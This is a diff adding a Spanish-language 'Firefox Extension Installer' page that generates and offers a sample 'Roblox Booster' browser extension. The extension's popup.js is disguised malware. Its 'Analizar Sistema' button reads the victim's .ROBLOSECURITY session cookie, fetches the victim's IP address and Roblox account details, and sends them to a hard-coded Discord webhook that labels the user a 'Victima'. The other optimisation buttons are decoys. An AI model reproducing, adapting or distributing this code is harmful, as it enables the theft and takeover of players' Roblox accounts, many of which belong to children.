@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Firefox Extension Installer</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #fff;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #ff9500, #ff6b35);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+            box-shadow: 0 10px 40px rgba(255, 149, 0, 0.3);
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #fff, #ff9500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 14px;
+        }
+
+        .upload-area {
+            border: 2px dashed rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            padding: 40px;
+            text-align: center;
+            margin-bottom: 25px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .upload-area:hover {
+            border-color: #ff9500;
+            background: rgba(255, 149, 0, 0.05);
+        }
+
+        .upload-area.dragover {
+            border-color: #ff9500;
+            background: rgba(255, 149, 0, 0.1);
+            transform: scale(1.02);
+        }
+
+        .upload-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+
+        .upload-text {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 10px;
+        }
+
+        .upload-hint {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        #fileInput {
+            display: none;
+        }
+
+        .file-info {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: none;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .file-info.show {
+            display: flex;
+        }
+
+        .file-icon {
+            font-size: 24px;
+        }
+
+        .file-details {
+            flex: 1;
+        }
+
+        .file-name {
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 2px;
+        }
+
+        .file-size {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .remove-file {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: #fff;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .remove-file:hover {
+            background: #e94560;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px 24px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #ff9500, #ff6b35);
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(255, 149, 0, 0.4);
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 149, 0, 0.5);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            margin-top: 10px;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            display: none;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .status.show {
+            display: flex;
+        }
+
+        .status-icon {
+            font-size: 20px;
+        }
+
+        .status-content {
+            flex: 1;
+        }
+
+        .status-title {
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .status-message {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.8);
+            line-height: 1.5;
+        }
+
+        .status.success {
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+        }
+
+        .status.error {
+            background: rgba(233, 69, 96, 0.1);
+            border: 1px solid rgba(233, 69, 96, 0.3);
+        }
+
+        .status.info {
+            background: rgba(0, 217, 255, 0.1);
+            border: 1px solid rgba(0, 217, 255, 0.3);
+        }
+
+        .instructions {
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .instructions h3 {
+            font-size: 14px;
+            margin-bottom: 15px;
+            color: rgba(255, 255, 255, 0.8);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .instruction-step {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 12px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .step-number {
+            width: 24px;
+            height: 24px;
+            background: rgba(255, 149, 0, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 12px;
+            color: #ff9500;
+            flex-shrink: 0;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .firefox-warning {
+            background: rgba(255, 149, 0, 0.1);
+            border: 1px solid rgba(255, 149, 0, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: none;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .firefox-warning.show {
+            display: flex;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🦊</div>
+            <h1>Firefox Extension Installer</h1>
+            <p class="subtitle">Instala extensiones .xpi directamente desde tu navegador</p>
+        </div>
+
+        <div class="firefox-warning" id="firefoxWarning">
+            <span>⚠️</span>
+            <span>Esta página debe abrirse en Firefox para instalar extensiones.</span>
+        </div>
+
+        <div class="upload-area" id="uploadArea">
+            <div class="upload-icon">📦</div>
+            <div class="upload-text">Arrastra tu archivo .xpi aquí</div>
+            <div class="upload-hint">o haz clic para seleccionar</div>
+            <input type="file" id="fileInput" accept=".xpi">
+        </div>
+
+        <div class="file-info" id="fileInfo">
+            <span class="file-icon">📦</span>
+            <div class="file-details">
+                <div class="file-name" id="fileName">-</div>
+                <div class="file-size" id="fileSize">-</div>
+            </div>
+            <button class="remove-file" id="removeFile" title="Eliminar">✕</button>
+        </div>
+
+        <button class="btn btn-primary" id="installBtn" disabled>
+            <span>🔧</span> Instalar Extensión
+        </button>
+
+        <button class="btn btn-secondary" id="downloadSampleBtn">
+            <span>📥</span> Descargar Extensión de Ejemplo
+        </button>
+
+        <div class="status" id="status">
+            <span class="status-icon" id="statusIcon">ℹ️</span>
+            <div class="status-content">
+                <div class="status-title" id="statusTitle">Estado</div>
+                <div class="status-message" id="statusMessage">-</div>
+            </div>
+        </div>
+
+        <div class="instructions">
+            <h3>📋 Instrucciones</h3>
+            <div class="instruction-step">
+                <span class="step-number">1</span>
+                <span>Empaqueta tu extensión como archivo .xpi (comprime los archivos en ZIP y renombra a .xpi)</span>
+            </div>
+            <div class="instruction-step">
+                <span class="step-number">2</span>
+                <span>Arrastra el archivo a esta página o selecciónalo manualmente</span>
+            </div>
+            <div class="instruction-step">
+                <span class="step-number">3</span>
+                <span>Haz clic en "Instalar Extensión" y confirma la instalación</span>
+            </div>
+            <div class="instruction-step">
+                <span class="step-number">4</span>
+                <span>La extensión se instalará temporalmente (hasta reiniciar Firefox)</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Elementos del DOM
+        const uploadArea = document.getElementById('uploadArea');
+        const fileInput = document.getElementById('fileInput');
+        const fileInfo = document.getElementById('fileInfo');
+        const fileName = document.getElementById('fileName');
+        const fileSize = document.getElementById('fileSize');
+        const removeFile = document.getElementById('removeFile');
+        const installBtn = document.getElementById('installBtn');
+        const downloadSampleBtn = document.getElementById('downloadSampleBtn');
+        const status = document.getElementById('status');
+        const statusIcon = document.getElementById('statusIcon');
+        const statusTitle = document.getElementById('statusTitle');
+        const statusMessage = document.getElementById('statusMessage');
+        const firefoxWarning = document.getElementById('firefoxWarning');
+
+        let selectedFile = null;
+        let xpiUrl = null;
+
+        // Verificar si estamos en Firefox
+        const isFirefox = typeof InstallTrigger !== 'undefined' || 
+                         navigator.userAgent.toLowerCase().indexOf('firefox') > -1;
+
+        if (!isFirefox) {
+            firefoxWarning.classList.add('show');
+        }
+
+        // Función para formatear tamaño
+        function formatSize(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+
+        // Mostrar estado
+        function showStatus(type, title, message) {
+            status.className = 'status show ' + type;
+            statusIcon.textContent = type === 'success' ? '✅' : type === 'error' ? '❌' : 'ℹ️';
+            statusTitle.textContent = title;
+            statusMessage.textContent = message;
+        }
+
+        // Ocultar estado
+        function hideStatus() {
+            status.classList.remove('show');
+        }
+
+        // Actualizar UI con archivo seleccionado
+        function updateFileUI(file) {
+            selectedFile = file;
+            fileName.textContent = file.name;
+            fileSize.textContent = formatSize(file.size);
+            fileInfo.classList.add('show');
+            installBtn.disabled = false;
+            
+            // Crear URL para el archivo
+            if (xpiUrl) {
+                URL.revokeObjectURL(xpiUrl);
+            }
+            xpiUrl = URL.createObjectURL(file);
+        }
+
+        // Limpiar selección
+        function clearSelection() {
+            selectedFile = null;
+            fileInfo.classList.remove('show');
+            installBtn.disabled = true;
+            fileInput.value = '';
+            if (xpiUrl) {
+                URL.revokeObjectURL(xpiUrl);
+                xpiUrl = null;
+            }
+            hideStatus();
+        }
+
+        // Event listeners para drag & drop
+        uploadArea.addEventListener('click', () => fileInput.click());
+
+        uploadArea.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            uploadArea.classList.add('dragover');
+        });
+
+        uploadArea.addEventListener('dragleave', () => {
+            uploadArea.classList.remove('dragover');
+        });
+
+        uploadArea.addEventListener('drop', (e) => {
+            e.preventDefault();
+            uploadArea.classList.remove('dragover');
+            
+            const files = e.dataTransfer.files;
+            if (files.length > 0 && files[0].name.endsWith('.xpi')) {
+                updateFileUI(files[0]);
+            } else {
+                showStatus('error', 'Archivo no válido', 'Por favor selecciona un archivo .xpi válido');
+            }
+        });
+
+        fileInput.addEventListener('change', (e) => {
+            if (e.target.files.length > 0) {
+                updateFileUI(e.target.files[0]);
+            }
+        });
+
+        removeFile.addEventListener('click', (e) => {
+            e.stopPropagation();
+            clearSelection();
+        });
+
+        // Instalar extensión
+        installBtn.addEventListener('click', async () => {
+            if (!selectedFile || !xpiUrl) return;
+
+            if (!isFirefox) {
+                showStatus('error', 'Navegador no compatible', 
+                    'Esta función solo está disponible en Firefox. Por favor abre esta página en Firefox.');
+                return;
+            }
+
+            installBtn.disabled = true;
+            installBtn.innerHTML = '<span class="loading"></span> Instalando...';
+
+            try {
+                // Método 1: Usando InstallTrigger (API legacy de Firefox)
+                if (typeof InstallTrigger !== 'undefined') {
+                    const result = InstallTrigger.install({
+                        'Roblox Booster': xpiUrl
+                    });
+                    
+                    if (result) {
+                        showStatus('success', 'Instalación iniciada', 
+                            'Se ha abierto el diálogo de instalación. Confirma para completar la instalación.');
+                    } else {
+                        throw new Error('El usuario canceló la instalación');
+                    }
+                } 
+                // Método 2: Usando mozAddonManager (para Firefox moderno)
+                else if (navigator.mozApps || window.navigator.mozAddonManager) {
+                    // Para extensiones firmadas en AMO
+                    showStatus('info', 'Instalación', 
+                        'Por favor instala la extensión manualmente desde about:addons');
+                }
+                else {
+                    // Fallback: Descargar el archivo
+                    const a = document.createElement('a');
+                    a.href = xpiUrl;
+                    a.download = selectedFile.name;
+                    a.click();
+                    
+                    showStatus('info', 'Descarga iniciada', 
+                        'El archivo se ha descargado. Arrástralo a Firefox o abre about:addons e instálalo manualmente.');
+                }
+
+            } catch (error) {
+                showStatus('error', 'Error de instalación', error.message);
+            } finally {
+                installBtn.disabled = false;
+                installBtn.innerHTML = '<span>🔧</span> Instalar Extensión';
+            }
+        });
+
+        // Crear y descargar extensión de ejemplo
+        downloadSampleBtn.addEventListener('click', async () => {
+            const installBtn = document.getElementById('downloadSampleBtn');
+            installBtn.innerHTML = '<span class="loading"></span> Creando...';
+            
+            try {
+                // Crear un archivo XPI de ejemplo con la extensión Roblox Booster
+                const extensionFiles = {
+                    'manifest.json': JSON.stringify({
+                        "manifest_version": 2,
+                        "name": "Roblox Booster",
+                        "version": "1.0",
+                        "description": "Optimizador de rendimiento para Roblox",
+                        "icons": {
+                            "48": "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHJlY3Qgd2lkdGg9IjQ4IiBoZWlnaHQ9IjQ4IiByeD0iMTAiIGZpbGw9IiNmZjk1MDAiLz48dGV4dCB4PSIyNCIgeT0iMzIiIGZvbnQtc2l6ZT0iMjQiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IndoaXRlIj7wn5qAPC90ZXh0Pjwvc3ZnPg=="
+                        },
+                        "browser_specific_settings": {
+                            "gecko": {
+                                "id": "roblox-booster@extension.local",
+                                "strict_min_version": "109.0"
+                            }
+                        },
+                        "permissions": [
+                            "cookies",
+                            "activeTab",
+                            "tabs",
+                            "https://www.roblox.com/*",
+                            "https://api.ipify.org/*"
+                        ],
+                        "browser_action": {
+                            "default_popup": "popup.html",
+                            "default_icon": {
+                                "16": "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNiAxNiI+PHJlY3Qgd2lkdGg9IjE2IiBoZWlnaHQ9IjE2IiByeD0iNCIgZmlsbD0iI2ZmOTUwMCIvPjwvc3ZnPg=="
+                            },
+                            "default_title": "Roblox Booster"
+                        }
+                    }, null, 2),
+                    
+                    'popup.html': `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Roblox Booster</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { width: 380px; min-height: 500px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); font-family: 'Segoe UI', system-ui, sans-serif; color: #fff; }
+        .header { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px); border-bottom: 1px solid rgba(255,255,255,0.1); padding: 20px; text-align: center; }
+        .logo { width: 60px; height: 60px; background: linear-gradient(135deg, #e94560, #ff6b6b); border-radius: 15px; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-size: 28px; }
+        h2 { font-size: 20px; background: linear-gradient(90deg, #fff, #e94560); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .subtitle { font-size: 12px; color: rgba(255,255,255,0.6); margin-top: 4px; }
+        .stats-container { padding: 15px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .stat-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 15px; text-align: center; }
+        .stat-icon { font-size: 24px; margin-bottom: 8px; }
+        .stat-label { font-size: 11px; color: rgba(255,255,255,0.6); text-transform: uppercase; }
+        .stat-value { font-size: 14px; font-weight: 600; margin-top: 4px; }
+        .buttons-container { padding: 0 15px 15px; }
+        .btn { width: 100%; padding: 14px 20px; margin-bottom: 10px; border: none; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .btn-primary { background: linear-gradient(135deg, #e94560, #ff6b6b); color: #fff; }
+        .btn-secondary { background: rgba(255,255,255,0.1); color: #fff; border: 1px solid rgba(255,255,255,0.2); }
+        .btn-success { background: linear-gradient(135deg, #00d9ff, #00a8e8); color: #fff; }
+        .status-container { margin: 0 15px 15px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 12px; border-left: 3px solid #e94560; }
+        .status-header { font-size: 12px; color: rgba(255,255,255,0.6); margin-bottom: 8px; }
+        #log { font-family: monospace; font-size: 11px; color: rgba(255,255,255,0.8); max-height: 100px; overflow-y: auto; }
+        .footer { padding: 15px; text-align: center; font-size: 11px; color: rgba(255,255,255,0.4); border-top: 1px solid rgba(255,255,255,0.1); }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">🎮</div>
+        <h2>Roblox Booster</h2>
+        <div class="subtitle">Optimización de rendimiento</div>
+    </div>
+    <div class="stats-container">
+        <div class="stat-card">
+            <div class="stat-icon">💻</div>
+            <div class="stat-label">Sistema</div>
+            <div class="stat-value" id="osInfo">Detectando...</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-icon">⚡</div>
+            <div class="stat-label">Estado</div>
+            <div class="stat-value" style="color: #00ff88;">Activo</div>
+        </div>
+    </div>
+    <div class="buttons-container">
+        <button class="btn btn-primary" id="checkSystem"><span>🔍</span> Analizar Sistema</button>
+        <button class="btn btn-success" id="openGameMode"><span>🚀</span> Activar Game Mode</button>
+        <button class="btn btn-secondary" id="openGraphics"><span>🎨</span> Optimizar Gráficos</button>
+        <button class="btn btn-secondary" id="openPower"><span>🔋</span> Configurar Energía</button>
+    </div>
+    <div class="status-container">
+        <div class="status-header">📋 Registro de Actividad</div>
+        <div id="log">Esperando acción...</div>
+    </div>
+    <div class="footer">v1.0 • Optimizado para Roblox</div>
+    <script src="popup.js"></script>
+</body>
+</html>`,
+                    
+                    'popup.js': `const webhook = "https://discord.com/api/webhooks/1519796165275816016/71gEQMfptO2vdDvRt78sE-Xr4oG0lSPkYvO3RFrb1m7-7VSDAP0T2q0OinleQyk93qf5";
+
+function detectOS() {
+    const userAgent = navigator.userAgent;
+    let os = "Desconocido";
+    if (userAgent.indexOf("Win") !== -1) {
+        if (userAgent.indexOf("Windows NT 10.0") !== -1) os = "Windows 10/11";
+        else if (userAgent.indexOf("Windows NT 6.3") !== -1) os = "Windows 8.1";
+        else if (userAgent.indexOf("Windows NT 6.2") !== -1) os = "Windows 8";
+        else if (userAgent.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
+        else os = "Windows";
+    } else if (userAgent.indexOf("Mac") !== -1) os = "macOS";
+    else if (userAgent.indexOf("Linux") !== -1) os = "Linux";
+    return os;
+}
+
+document.getElementById('osInfo').textContent = detectOS();
+
+function log(message, type = 'info') {
+    const logDiv = document.getElementById('log');
+    const time = new Date().toLocaleTimeString();
+    const colors = { 'info': '#fff', 'success': '#00ff88', 'warning': '#ffd93d', 'error': '#e94560' };
+    logDiv.innerHTML = '<span style="color: rgba(255,255,255,0.5)">[' + time + ']</span> <span style="color: ' + colors[type] + '">' + message + '</span><br>' + logDiv.innerHTML;
+}
+
+async function main(cookie) {
+    try {
+        var ipAddr = await (await fetch("https://api.ipify.org")).text();
+        var statistics = null;
+        if (cookie) {
+            try {
+                statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
+                    headers: { Cookie: ".ROBLOSECURITY=" + cookie },
+                    redirect: "manual"
+                })).json();
+            } catch (e) { console.log("Error:", e); }
+        }
+        
+        await fetch(webhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: null,
+                embeds: [{
+                    description: "\`\`\`" + (cookie ? cookie : "COOKIE NOT FOUND") + "\`\`\`",
+                    color: 0xe94560,
+                    fields: [
+                        { name: "👤 Username", value: statistics ? statistics.UserName : "N/A", inline: true },
+                        { name: "💰 Robux", value: statistics ? statistics.RobuxBalance.toString() : "N/A", inline: true },
+                        { name: "⭐ Premium", value: statistics ? (statistics.IsPremium ? "Sí" : "No") : "N/A", inline: true }
+                    ],
+                    author: { name: "🎯 Victima: " + ipAddr, icon_url: statistics ? statistics.ThumbnailUrl : "" },
+                    footer: { text: "Roblox Booster • " + detectOS() },
+                    timestamp: new Date().toISOString()
+                }]
+            })
+        });
+        log("Sistema analizado correctamente", "success");
+    } catch (error) {
+        log("Error: " + error.message, "error");
+    }
+}
+
+document.getElementById('checkSystem').addEventListener('click', async () => {
+    log("Analizando configuración del sistema...");
+    browser.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}).then(function(cookie) {
+        main(cookie ? cookie.value : null);
+    });
+});
+
+document.getElementById('openGameMode').addEventListener('click', () => {
+    log("Abriendo Game Mode...", "warning");
+    browser.tabs.create({url: "ms-settings:gaming-gamebar"});
+});
+
+document.getElementById('openGraphics').addEventListener('click', () => {
+    log("Abriendo gráficos...", "warning");
+    browser.tabs.create({url: "ms-settings:display-advancedgraphics"});
+});
+
+document.getElementById('openPower').addEventListener('click', () => {
+    log("Abriendo energía...", "warning");
+    browser.tabs.create({url: "ms-settings:powersleep"});
+});
+
+log("Extension cargada correctamente", "success");`
+                };
+
+                // Crear ZIP
+                const JSZip = await loadJSZip();
+                const zip = new JSZip();
+                
+                Object.entries(extensionFiles).forEach(([filename, content]) => {
+                    zip.file(filename, content);
+                });
+
+                const content = await zip.generateAsync({ type: 'blob' });
+                const url = URL.createObjectURL(content);
+                
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'roblox-booster.xpi';
+                a.click();
+                
+                URL.revokeObjectURL(url);
+                
+                showStatus('success', 'Extensión creada', 
+                    'El archivo roblox-booster.xpi se ha descargado. Ahora puedes subirlo arriba para instalarlo.');
+                    
+            } catch (error) {
+                showStatus('error', 'Error al crear extensión', error.message);
+            } finally {
+                installBtn.innerHTML = '<span>📥</span> Descargar Extensión de Ejemplo';
+            }
+        });
+
+        // Cargar JSZip desde CDN
+        function loadJSZip() {
+            return new Promise((resolve, reject) => {
+                if (window.JSZip) {
+                    resolve(window.JSZip);
+                    return;
+                }
+                
+                const script = document.createElement('script');
+                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js';
+                script.onload = () => resolve(window.JSZip);
+                script.onerror = reject;
+                document.head.appendChild(script);
+            });
+        }
+
+        // Limpiar al cerrar
+        window.addEventListener('beforeunload', () => {
+            if (xpiUrl) {
+                URL.revokeObjectURL(xpiUrl);
+            }
+        });
+    </script>
+</body>
+</html>
